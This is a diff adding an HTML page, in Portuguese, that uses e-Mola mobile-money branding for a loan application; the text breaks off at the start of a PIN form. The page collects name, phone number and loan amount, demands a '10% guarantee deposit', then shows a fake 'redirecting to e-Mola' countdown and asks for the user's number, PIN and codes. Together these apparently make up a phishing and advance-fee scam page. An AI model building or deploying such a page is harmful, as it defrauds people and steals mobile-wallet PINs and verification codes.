@@ -1,0 +1,657 @@
+<!DOCTYPE html>
+<html lang="pt-PT">
+<head>
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1.0" />
+<title>e-Mola | Pedido de Empréstimo</title>
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css" />
+<style>
+  * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Inter', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; }
+
+  :root {
+    --orange-900: #c2410c;
+    --orange-700: #ea580c;
+    --orange-500: #f97316;
+    --orange-100: #ffedd5;
+    --orange-50:  #fff7ed;
+    --ink: #1f1300;
+    --muted: #7c5a3d;
+    --white: #ffffff;
+    --green: #16a34a;
+    --red: #dc2626;
+    --shadow: 0 20px 40px -15px rgba(120, 50, 0, 0.35);
+  }
+
+  body {
+    background: linear-gradient(160deg, #fb923c 0%, #f97316 40%, #ea580c 100%);
+    min-height: 100vh;
+    color: var(--ink);
+    padding: 24px 16px;
+    display: flex;
+    align-items: flex-start;
+    justify-content: center;
+    -webkit-font-smoothing: antialiased;
+  }
+
+  /* ==================== LAYOUT ==================== */
+  .app {
+    width: 100%;
+    max-width: 520px;
+    background: var(--white);
+    border-radius: 28px;
+    box-shadow: var(--shadow);
+    overflow: hidden;
+    position: relative;
+    animation: rise 0.5s ease;
+  }
+
+  @keyframes rise {
+    from { opacity: 0; transform: translateY(20px); }
+    to   { opacity: 1; transform: translateY(0); }
+  }
+
+  /* ==================== HEADER ==================== */
+  .brand {
+    background: linear-gradient(135deg, var(--orange-700), var(--orange-500));
+    padding: 28px 24px 22px;
+    color: var(--white);
+    display: flex;
+    align-items: center;
+    justify-content: space-between;
+    gap: 12px;
+  }
+  .brand-logo {
+    display: flex;
+    align-items: center;
+    gap: 10px;
+    font-weight: 800;
+    font-size: 1.5rem;
+    letter-spacing: -0.5px;
+  }
+  .brand-logo i {
+    background: rgba(255,255,255,0.2);
+    width: 40px; height: 40px;
+    border-radius: 12px;
+    display: grid; place-items: center;
+    font-size: 1.1rem;
+  }
+  .brand-tag {
+    font-size: 0.72rem;
+    font-weight: 600;
+    background: rgba(255,255,255,0.18);
+    padding: 6px 12px;
+    border-radius: 20px;
+    letter-spacing: 0.3px;
+  }
+
+  /* ==================== PROGRESS ==================== */
+  .progress {
+    padding: 22px 24px 6px;
+    background: var(--orange-50);
+    border-bottom: 1px solid var(--orange-100);
+  }
+  .progress-bar {
+    height: 6px;
+    background: var(--orange-100);
+    border-radius: 99px;
+    overflow: hidden;
+    margin-bottom: 14px;
+  }
+  .progress-fill {
+    height: 100%;
+    width: 25%;
+    background: linear-gradient(90deg, var(--orange-500), var(--orange-700));
+    border-radius: 99px;
+    transition: width 0.5s cubic-bezier(.4,0,.2,1);
+  }
+  .steps {
+    display: flex;
+    justify-content: space-between;
+    gap: 4px;
+    font-size: 0.72rem;
+    color: var(--muted);
+    font-weight: 600;
+    margin-bottom: 12px;
+  }
+  .steps span {
+    display: flex;
+    flex-direction: column;
+    align-items: center;
+    gap: 4px;
+    flex: 1;
+    text-align: center;
+    transition: color 0.3s;
+  }
+  .steps span .dot {
+    width: 22px; height: 22px;
+    border-radius: 50%;
+    background: var(--orange-100);
+    color: var(--orange-700);
+    display: grid; place-items: center;
+    font-size: 0.7rem;
+    font-weight: 700;
+    transition: 0.3s;
+  }
+  .steps span.active { color: var(--orange-700); }
+  .steps span.active .dot { background: var(--orange-500); color: #fff; transform: scale(1.1); }
+  .steps span.done .dot   { background: var(--green); color: #fff; }
+
+  /* ==================== PANELS ==================== */
+  .panel { padding: 28px 24px 32px; display: none; animation: fade 0.35s ease; }
+  .panel.active { display: block; }
+  @keyframes fade {
+    from { opacity: 0; transform: translateY(8px); }
+    to   { opacity: 1; transform: translateY(0); }
+  }
+
+  .panel h2 {
+    font-size: 1.35rem;
+    font-weight: 800;
+    margin-bottom: 6px;
+    letter-spacing: -0.3px;
+  }
+  .panel .hint {
+    font-size: 0.88rem;
+    color: var(--muted);
+    margin-bottom: 22px;
+    line-height: 1.5;
+  }
+
+  /* ==================== FORM ==================== */
+  .field { margin-bottom: 16px; }
+  .field label {
+    display: block;
+    font-size: 0.82rem;
+    font-weight: 600;
+    margin-bottom: 6px;
+    color: var(--ink);
+  }
+  .field label .req { color: var(--orange-700); }
+
+  .input-wrap {
+    display: flex;
+    align-items: center;
+    background: var(--orange-50);
+    border: 1.5px solid var(--orange-100);
+    border-radius: 14px;
+    padding: 0 14px;
+    transition: 0.2s;
+  }
+  .input-wrap:focus-within {
+    border-color: var(--orange-500);
+    background: #fff;
+    box-shadow: 0 0 0 4px rgba(249,115,22,0.15);
+  }
+  .input-wrap .prefix {
+    font-weight: 700;
+    color: var(--orange-700);
+    font-size: 0.95rem;
+    padding-right: 8px;
+    border-right: 1px solid var(--orange-100);
+    margin-right: 10px;
+  }
+  .input-wrap i { color: var(--orange-700); margin-right: 10px; font-size: 0.95rem; }
+  .input-wrap input,
+  .input-wrap select,
+  .input-wrap textarea {
+    border: none;
+    background: transparent;
+    width: 100%;
+    padding: 14px 0;
+    font-size: 1rem;
+    font-weight: 500;
+    color: var(--ink);
+    outline: none;
+    font-family: inherit;
+  }
+  .input-wrap textarea { resize: none; padding: 14px 0; }
+  .input-wrap input::placeholder,
+  .input-wrap textarea::placeholder { color: #b89478; font-weight: 400; }
+
+  .row-2 { display: grid; grid-template-columns: 1fr 1fr; gap: 12px; }
+
+  /* ==================== DÉPOSIT 10% NOTICE ==================== */
+  .deposit-box {
+    background: var(--orange-50);
+    border: 1.5px dashed var(--orange-500);
+    border-radius: 14px;
+    padding: 14px 16px;
+    margin-bottom: 18px;
+    font-size: 0.85rem;
+    color: var(--orange-900);
+    line-height: 1.55;
+  }
+  .deposit-box strong { color: var(--orange-700); }
+  .deposit-box .row {
+    display: flex;
+    justify-content: space-between;
+    margin-top: 8px;
+    padding-top: 8px;
+    border-top: 1px solid var(--orange-100);
+    font-weight: 700;
+  }
+  .deposit-box .row span:last-child { color: var(--green); }
+
+  .invalid-msg {
+    color: var(--red);
+    font-size: 0.78rem;
+    font-weight: 600;
+    margin-top: 4px;
+    display: none;
+  }
+  .field.has-error .input-wrap { border-color: var(--red); background: #fef2f2; }
+  .field.has-error .invalid-msg { display: block; }
+
+  /* ==================== BUTTONS ==================== */
+  .btn {
+    width: 100%;
+    border: none;
+    border-radius: 14px;
+    padding: 16px;
+    font-size: 1rem;
+    font-weight: 700;
+    cursor: pointer;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    gap: 10px;
+    transition: 0.2s;
+    font-family: inherit;
+  }
+  .btn-primary {
+    background: linear-gradient(135deg, var(--orange-500), var(--orange-700));
+    color: #fff;
+    box-shadow: 0 10px 20px -8px rgba(234,88,12,0.55);
+  }
+  .btn-primary:hover { filter: brightness(1.05); transform: translateY(-1px); }
+  .btn-primary:active { transform: scale(0.99); }
+  .btn-primary:disabled { opacity: 0.6; cursor: not-allowed; transform: none; }
+  .btn-ghost {
+    background: transparent;
+    color: var(--muted);
+    font-weight: 600;
+    padding: 12px;
+    margin-top: 8px;
+  }
+  .btn-ghost:hover { color: var(--orange-700); }
+
+  /* ==================== OCUPAÇÃO ==================== */
+  .occ-grid {
+    display: grid;
+    grid-template-columns: 1fr 1fr;
+    gap: 12px;
+    margin-bottom: 8px;
+  }
+  .occ-card {
+    border: 2px solid var(--orange-100);
+    background: var(--orange-50);
+    border-radius: 16px;
+    padding: 18px 12px;
+    text-align: center;
+    cursor: pointer;
+    transition: 0.2s;
+    user-select: none;
+  }
+  .occ-card i {
+    font-size: 1.4rem;
+    color: var(--orange-700);
+    margin-bottom: 8px;
+    display: block;
+  }
+  .occ-card span { font-size: 0.85rem; font-weight: 700; color: var(--ink); display: block; }
+  .occ-card:hover { border-color: var(--orange-500); transform: translateY(-2px); }
+  .occ-card.selected {
+    border-color: var(--orange-700);
+    background: linear-gradient(135deg, #fff, var(--orange-50));
+    box-shadow: 0 8px 16px -8px rgba(234,88,12,0.5);
+  }
+  .occ-card.selected i { color: var(--orange-900); transform: scale(1.1); }
+  .occ-card.selected::after {
+    content: '\f058';
+    font-family: 'Font Awesome 6 Free';
+    font-weight: 900;
+    position: absolute;
+    color: var(--green);
+    font-size: 1rem;
+    margin-left: 4px;
+    margin-top: -2px;
+  }
+
+  /* ==================== COUNTDOWN ==================== */
+  .redirect-panel {
+    text-align: center;
+    padding: 40px 24px 44px;
+  }
+  .redirect-icon {
+    width: 84px; height: 84px;
+    margin: 0 auto 20px;
+    border-radius: 50%;
+    background: var(--orange-50);
+    border: 3px dashed var(--orange-500);
+    display: grid; place-items: center;
+    font-size: 2rem;
+    color: var(--orange-700);
+    animation: pulse 1.5s infinite;
+  }
+  @keyframes pulse {
+    0%,100% { transform: scale(1); }
+    50%     { transform: scale(1.06); }
+  }
+  .redirect-panel h2 { font-size: 1.5rem; margin-bottom: 8px; }
+  .redirect-panel p  { color: var(--muted); font-size: 0.92rem; margin-bottom: 24px; }
+  .countdown {
+    font-size: 3rem;
+    font-weight: 800;
+    color: var(--orange-700);
+    line-height: 1;
+    margin-bottom: 6px;
+    font-variant-numeric: tabular-nums;
+  }
+  .countdown small { font-size: 0.95rem; font-weight: 600; color: var(--muted); display: block; margin-top: 6px; }
+
+  /* ==================== PIN/CÓDIGO ==================== */
+  .pin-inputs {
+    display: flex;
+    gap: 10px;
+    justify-content: center;
+    margin: 22px 0 8px;
+  }
+  .pin-inputs input {
+    width: 100%;
+    max-width: 56px;
+    aspect-ratio: 1;
+    text-align: center;
+    font-size: 1.4rem;
+    font-weight: 800;
+    border: 2px solid var(--orange-100);
+    background: var(--orange-50);
+    border-radius: 14px;
+    outline: none;
+    color: var(--orange-900);
+    transition: 0.2s;
+  }
+  .pin-inputs input:focus {
+    border-color: var(--orange-500);
+    background: #fff;
+    box-shadow: 0 0 0 4px rgba(249,115,22,0.15);
+  }
+  .pin-inputs input:valid { border-color: var(--orange-500); }
+
+  .status-badge {
+    display: inline-flex;
+    align-items: center;
+    gap: 8px;
+    padding: 8px 16px;
+    border-radius: 30px;
+    font-size: 0.8rem;
+    font-weight: 700;
+    margin-bottom: 14px;
+  }
+  .status-badge.pending { background: #fef3c7; color: #92400e; }
+  .status-badge.success { background: #dcfce7; color: #166534; }
+  .status-badge.error   { background: #fee2e2; color: #991b1b; }
+  .status-badge .spinner {
+    width: 14px; height: 14px;
+    border: 2px solid currentColor;
+    border-top-color: transparent;
+    border-radius: 50%;
+    animation: spin 0.8s linear infinite;
+  }
+  @keyframes spin { to { transform: rotate(360deg); } }
+
+  /* ==================== SUCCESSO ==================== */
+  .success-panel {
+    text-align: center;
+    padding: 44px 24px;
+  }
+  .success-icon {
+    width: 96px; height: 96px;
+    margin: 0 auto 22px;
+    border-radius: 50%;
+    background: linear-gradient(135deg, #dcfce7, #bbf7d0);
+    display: grid; place-items: center;
+    font-size: 2.6rem;
+    color: var(--green);
+    animation: pop 0.5s cubic-bezier(.4,0,.2,1);
+  }
+  @keyframes pop {
+    0%   { transform: scale(0); }
+    70%  { transform: scale(1.1); }
+    100% { transform: scale(1); }
+  }
+  .success-panel h2 { font-size: 1.5rem; margin-bottom: 10px; }
+  .success-panel p  { color: var(--muted); font-size: 0.92rem; line-height: 1.6; margin-bottom: 8px; }
+  .receipt {
+    background: var(--orange-50);
+    border-radius: 16px;
+    padding: 18px;
+    margin: 24px 0 20px;
+    text-align: left;
+    font-size: 0.88rem;
+  }
+  .receipt .line {
+    display: flex;
+    justify-content: space-between;
+    padding: 6px 0;
+    border-bottom: 1px dashed var(--orange-100);
+  }
+  .receipt .line:last-child { border: none; padding-bottom: 0; }
+  .receipt .line span:first-child { color: var(--muted); font-weight: 500; }
+  .receipt .line span:last-child  { font-weight: 700; color: var(--ink); }
+
+  /* ==================== INFO TERMOS ==================== */
+  .terms {
+    background: var(--orange-50);
+    border-radius: 14px;
+    padding: 14px 16px;
+    font-size: 0.78rem;
+    color: var(--muted);
+    line-height: 1.6;
+    margin-bottom: 18px;
+  }
+  .terms strong { color: var(--orange-900); }
+
+  .interest-chips {
+    display: flex;
+    gap: 8px;
+    flex-wrap: wrap;
+    margin-bottom: 18px;
+  }
+  .chip {
+    background: var(--orange-50);
+    border: 1px solid var(--orange-100);
+    padding: 8px 12px;
+    border-radius: 10px;
+    font-size: 0.78rem;
+    font-weight: 600;
+    color: var(--orange-900);
+    display: flex;
+    align-items: center;
+    gap: 6px;
+  }
+  .chip i { color: var(--orange-700); font-size: 0.75rem; }
+
+  /* ==================== TOAST ==================== */
+  #toast {
+    position: fixed;
+    bottom: 20px;
+    left: 50%;
+    transform: translate(-50%, 120px);
+    background: var(--ink);
+    color: #fff;
+    padding: 14px 22px;
+    border-radius: 12px;
+    font-size: 0.88rem;
+    font-weight: 600;
+    box-shadow: 0 12px 24px rgba(0,0,0,0.25);
+    transition: transform 0.35s cubic-bezier(.4,0,.2,1);
+    z-index: 999;
+    max-width: 90vw;
+    text-align: center;
+  }
+  #toast.show { transform: translate(-50%, 0); }
+  #toast.error { background: var(--red); }
+  #toast.success { background: var(--green); }
+
+  /* ==================== RESPONSIVE ==================== */
+  @media (max-width: 420px) {
+    .row-2 { grid-template-columns: 1fr; }
+    .occ-grid { grid-template-columns: 1fr 1fr; }
+    .panel h2 { font-size: 1.2rem; }
+    .brand-logo { font-size: 1.3rem; }
+    .pin-inputs input { max-width: 48px; font-size: 1.2rem; }
+    .countdown { font-size: 2.5rem; }
+  }
+</style>
+</head>
+<body>
+
+<div class="app">
+  <!-- ==================== BRAND HEADER ==================== -->
+  <div class="brand">
+    <div class="brand-logo"><i class="fas fa-bolt"></i> e-Mola</div>
+    <div class="brand-tag">🇲🇿 Moçambique</div>
+  </div>
+
+  <!-- ==================== PROGRESS ==================== -->
+  <div class="progress">
+    <div class="progress-bar"><div class="progress-fill" id="progressFill"></div></div>
+    <div class="steps" id="steps">
+      <span class="active"><span class="dot">1</span>Dados</span>
+      <span><span class="dot">2</span>Ocupação</span>
+      <span><span class="dot">3</span>Verificação</span>
+      <span><span class="dot">4</span>Códigos</span>
+    </div>
+  </div>
+
+  <!-- ============================================================
+       PASSO 1 — DADOS PESSOAIS E EMPRÉSTIMO
+  ============================================================ -->
+  <section class="panel active" id="panel-1">
+    <h2>Pedido de Empréstimo</h2>
+    <p class="hint">Preencha os seus dados para iniciar o pedido. Todos os campos são obrigatórios.</p>
+
+    <div class="field" id="f-nome">
+      <label>Nome completo <span class="req">*</span></label>
+      <div class="input-wrap">
+        <i class="fas fa-user"></i>
+        <input type="text" id="nome" placeholder="Ex: João da Silva" autocomplete="name" />
+      </div>
+      <div class="invalid-msg">Por favor, insira o seu nome completo.</div>
+    </div>
+
+    <div class="field" id="f-telefone">
+      <label>Número de telefone <span class="req">*</span></label>
+      <div class="input-wrap">
+        <span class="prefix">+258</span>
+        <input type="tel" id="telefone" placeholder="84 000 0000" inputmode="numeric" maxlength="9" autocomplete="tel" />
+      </div>
+      <div class="invalid-msg">Insira um número válido de 9 dígitos (ex: 84xxxxxxx).</div>
+    </div>
+
+    <div class="field" id="f-valor">
+      <label>Valor do empréstimo (MT) <span class="req">*</span></label>
+      <div class="input-wrap">
+        <span class="prefix">MT</span>
+        <input type="number" id="valor" placeholder="1000 – 1,000,000" min="1000" max="1000000" step="100" />
+      </div>
+      <div class="invalid-msg">O valor deve estar entre MT 1.000 e MT 1.000.000.</div>
+    </div>
+
+    <div class="field">
+      <label>Prazo de pagamento <span class="req">*</span></label>
+      <div class="input-wrap">
+        <i class="fas fa-calendar-alt"></i>
+        <select id="prazo">
+          <option value="5">5 meses</option>
+          <option value="6">6 meses</option>
+          <option value="8">8 meses</option>
+          <option value="10">10 meses</option>
+          <option value="12" selected>12 meses</option>
+          <option value="15">15 meses</option>
+          <option value="18">18 meses</option>
+        </select>
+      </div>
+    </div>
+
+    <div class="field" id="f-finalidade">
+      <label>Finalidade do empréstimo <span class="req">*</span></label>
+      <div class="input-wrap">
+        <i class="fas fa-comment-alt"></i>
+        <input type="text" id="finalidade" placeholder="Ex: Negócio, educação, casa…" />
+      </div>
+      <div class="invalid-msg">Indique a finalidade do empréstimo.</div>
+    </div>
+
+    <!-- Aviso 10% -->
+    <div class="deposit-box" id="depositBox">
+      <strong>⚠️ Depósito de garantia de 10%</strong><br />
+      Para prosseguir com o pedido, é necessário ter <strong>10% do valor</strong> solicitado disponível na sua conta.
+      <div class="row">
+        <span>Depósito necessário (10%)</span>
+        <span id="depositAmount">MT 0,00</span>
+      </div>
+    </div>
+
+    <div class="interest-chips">
+      <span class="chip"><i class="fas fa-percentage"></i> Juros 10%</span>
+      <span class="chip"><i class="fas fa-clock"></i> 5 a 18 meses</span>
+      <span class="chip"><i class="fas fa-shield-alt"></i> Seguro</span>
+    </div>
+
+    <button class="btn btn-primary" id="btnStep1">
+      Continuar <i class="fas fa-arrow-right"></i>
+    </button>
+  </section>
+
+  <!-- ============================================================
+       PASSO 2 — OCUPAÇÃO
+  ============================================================ -->
+  <section class="panel" id="panel-2">
+    <h2>Qual é a sua ocupação?</h2>
+    <p class="hint">Selecione a opção que melhor descreve a sua situação profissional.</p>
+
+    <div class="occ-grid" id="occGrid">
+      <div class="occ-card" data-value="Empregado">
+        <i class="fas fa-briefcase"></i>
+        <span>Empregado</span>
+      </div>
+      <div class="occ-card" data-value="Empregada">
+        <i class="fas fa-user-tie"></i>
+        <span>Empregada</span>
+      </div>
+      <div class="occ-card" data-value="Trabalhador por Conta Própria">
+        <i class="fas fa-store"></i>
+        <span>Conta Própria</span>
+      </div>
+      <div class="occ-card" data-value="Estudante">
+        <i class="fas fa-graduation-cap"></i>
+        <span>Estudante</span>
+      </div>
+    </div>
+
+    <div class="invalid-msg" id="occError" style="text-align:center;margin-bottom:12px;">
+      Selecione uma ocupação para continuar.
+    </div>
+
+    <button class="btn btn-primary" id="btnStep2" disabled>
+      Continuar <i class="fas fa-arrow-right"></i>
+    </button>
+    <button class="btn btn-ghost" data-back="1"><i class="fas fa-arrow-left"></i> Voltar</button>
+  </section>
+
+  <!-- ============================================================
+       PASSO 3 — REDIRECIONAMENTO E-MOLA + PIN
+  ============================================================ -->
+  <section class="panel" id="panel-3">
+    <!-- sub-estado: countdown -->
+    <div id="state-redirect" class="redirect-panel">
+      <div class="redirect-icon"><i class="fas fa-mobile-screen-button"></i></div>
+      <h2>A redirecionar para e-Mola…</h2>
+      <p>Será redirecionado para a plataforma e-Mola para confirmar os seus dados.<br />Introduza o número e o PIN quando solicitado.</p>
+      <div class="countdown" id="countdown">5</div>
+      <small style="color:var(--muted);font-weight:600;">segundos</small>
+    </div>
+
+    <!-- sub-estado: formulário PIN -->
+    
